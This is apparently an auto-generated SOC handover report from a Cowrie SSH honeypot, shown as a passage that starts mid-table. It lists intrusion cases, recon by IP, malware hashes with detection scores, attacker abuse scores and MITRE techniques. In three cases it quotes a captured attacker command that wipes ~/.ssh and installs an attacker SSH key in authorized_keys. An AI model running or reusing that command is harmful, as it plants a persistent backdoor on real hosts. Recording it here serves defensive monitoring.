| `2026-04-21 05:29:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.194.239[.]180` to AbuseIPDB if not already reported
- [ ] Block `103.194.239[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f05fccacba69

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-04-21 05:31 |
| **Last Seen** | 2026-04-21 05:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:31:19` | `cowrie.session.connect` |
| `2026-04-21 05:31:19` | `cowrie.client.version` |
| `2026-04-21 05:31:19` | `cowrie.client.kex` |
| `2026-04-21 05:31:19` | `cowrie.login.success` |
| `2026-04-21 05:31:19` | `cowrie.session.params` |
| `2026-04-21 05:31:19` | `cowrie.command.input` |
| `2026-04-21 05:31:19` | `cowrie.command.failed` |
| `2026-04-21 05:31:20` | `cowrie.log.closed` |
| `2026-04-21 05:31:20` | `cowrie.session.params` |
| `2026-04-21 05:31:20` | `cowrie.command.input` |
| `2026-04-21 05:31:20` | `cowrie.session.file_download` |
| `2026-04-21 05:31:20` | `cowrie.log.closed` |
| `2026-04-21 05:31:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1a4c0f6620e

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-04-21 05:31 |
| **Last Seen** | 2026-04-21 05:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:31:22` | `cowrie.session.connect` |
| `2026-04-21 05:31:22` | `cowrie.client.version` |
| `2026-04-21 05:31:22` | `cowrie.client.kex` |
| `2026-04-21 05:31:23` | `cowrie.login.success` |
| `2026-04-21 05:31:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f921dc3f05e

| Field | Detail |
|---|---|
| **Source IP** | `182.229.12[.]64` |
| **First Seen** | 2026-04-21 05:33 |
| **Last Seen** | 2026-04-21 05:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:33:51` | `cowrie.session.connect` |
| `2026-04-21 05:33:51` | `cowrie.client.version` |
| `2026-04-21 05:33:51` | `cowrie.client.kex` |
| `2026-04-21 05:33:52` | `cowrie.login.success` |
| `2026-04-21 05:33:52` | `cowrie.session.params` |
| `2026-04-21 05:33:52` | `cowrie.command.input` |
| `2026-04-21 05:33:52` | `cowrie.command.failed` |
| `2026-04-21 05:33:52` | `cowrie.log.closed` |
| `2026-04-21 05:33:52` | `cowrie.session.params` |
| `2026-04-21 05:33:52` | `cowrie.command.input` |
| `2026-04-21 05:33:53` | `cowrie.session.file_download` |
| `2026-04-21 05:33:53` | `cowrie.log.closed` |
| `2026-04-21 05:33:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.229.12[.]64` to AbuseIPDB if not already reported
- [ ] Block `182.229.12[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9187f2c96e4

| Field | Detail |
|---|---|
| **Source IP** | `182.229.12[.]64` |
| **First Seen** | 2026-04-21 05:33 |
| **Last Seen** | 2026-04-21 05:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:33:55` | `cowrie.session.connect` |
| `2026-04-21 05:33:55` | `cowrie.client.version` |
| `2026-04-21 05:33:55` | `cowrie.client.kex` |
| `2026-04-21 05:33:55` | `cowrie.login.success` |
| `2026-04-21 05:33:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.229.12[.]64` to AbuseIPDB if not already reported
- [ ] Block `182.229.12[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87bf5b36d5b5

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-04-21 05:36 |
| **Last Seen** | 2026-04-21 05:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:36:54` | `cowrie.session.connect` |
| `2026-04-21 05:36:54` | `cowrie.client.version` |
| `2026-04-21 05:36:54` | `cowrie.client.kex` |
| `2026-04-21 05:36:55` | `cowrie.login.success` |
| `2026-04-21 05:36:55` | `cowrie.session.params` |
| `2026-04-21 05:36:55` | `cowrie.command.input` |
| `2026-04-21 05:36:55` | `cowrie.command.failed` |
| `2026-04-21 05:36:55` | `cowrie.log.closed` |
| `2026-04-21 05:36:55` | `cowrie.session.params` |
| `2026-04-21 05:36:55` | `cowrie.command.input` |
| `2026-04-21 05:36:56` | `cowrie.session.file_download` |
| `2026-04-21 05:36:56` | `cowrie.log.closed` |
| `2026-04-21 05:36:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a2d78426502

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]79` |
| **First Seen** | 2026-04-21 05:36 |
| **Last Seen** | 2026-04-21 05:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 05:36:58` | `cowrie.session.connect` |
| `2026-04-21 05:36:58` | `cowrie.client.version` |
| `2026-04-21 05:36:58` | `cowrie.client.kex` |
| `2026-04-21 05:36:58` | `cowrie.login.success` |
| `2026-04-21 05:36:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]79` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.194.239[.]180` | **25** | 2026-04-21 04:51 | 2026-04-21 05:33 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.200.25[.]79` | **25** | 2026-04-21 04:48 | 2026-04-21 05:36 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `182.229.12[.]64` | **25** | 2026-04-21 04:51 | 2026-04-21 05:33 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `223.123.38[.]35` | **25** | 2026-04-21 02:54 | 2026-04-21 02:59 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `37.143.61[.]132` | **25** | 2026-04-21 04:48 | 2026-04-21 05:24 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `3.131.220[.]121` | **5** | 2026-04-21 04:10 | 2026-04-21 04:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `161.132.51[.]203` | **2** | 2026-04-21 05:31 | 2026-04-21 05:40 | 2m | 0 | `T1592` | 🟢 LOW |
| `20.55.35[.]217` | **2** | 2026-04-21 03:57 | 2026-04-21 03:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.82.92[.]255` | 1 | 2026-04-21 04:54 | 2026-04-21 04:54 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.227.31[.]13` | 1 | 2026-04-21 04:49 | 2026-04-21 04:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.112[.]109` | 1 | 2026-04-21 04:49 | 2026-04-21 04:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `147.182.164[.]239` | 1 | 2026-04-21 03:22 | 2026-04-21 03:22 | 10s | 0 | `T1592` | 🟢 LOW |
| `175.140.228[.]55` | 1 | 2026-04-21 03:02 | 2026-04-21 03:03 | 13s | 0 | `T1592` | 🟢 LOW |
| `176.65.148[.]141` | 1 | 2026-04-21 04:12 | 2026-04-21 04:12 | 30s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]214` | 1 | 2026-04-21 03:33 | 2026-04-21 03:33 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 42/100 | 🟡 MEDIUM | **31/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `147.182.164[.]239` | US | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `175.140.228[.]55` | MY | TMNST | **100** ⚠️ | 4 |
| `176.65.148[.]141` | NL | Pfcloud UG | **100** ⚠️ | 8 |
| `3.131.220[.]121` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `103.194.239[.]180` | HK | Asia Pacific Network Information Centre | **100** ⚠️ | 5 |
| `103.82.92[.]255` | ID | PT Situs Kreatif Indonesia | **100** ⚠️ | 8 |
| `45.33.12[.]214` | US | Linode | **100** ⚠️ | 50 |
| `37.143.61[.]132` | GB | Internet Utilities Europe and Asia Limited | **100** ⚠️ | 8 |
| `223.123.38[.]35` | PK | CMPak Limited | **100** ⚠️ | 43 |
| `182.229.12[.]64` | KR | LG POWERCOMM | **100** ⚠️ | 7 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 212 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 102 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 101 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 51 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 50 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 20 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 245 cases |
| Tool 34  | Credential Extractor        | ✅ 203 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 17 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (0.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 15 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 102 priority case(s) shown individually · 15 recon entry/entries in table (8 group(s) consolidating 134 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-21T06:06:02Z_
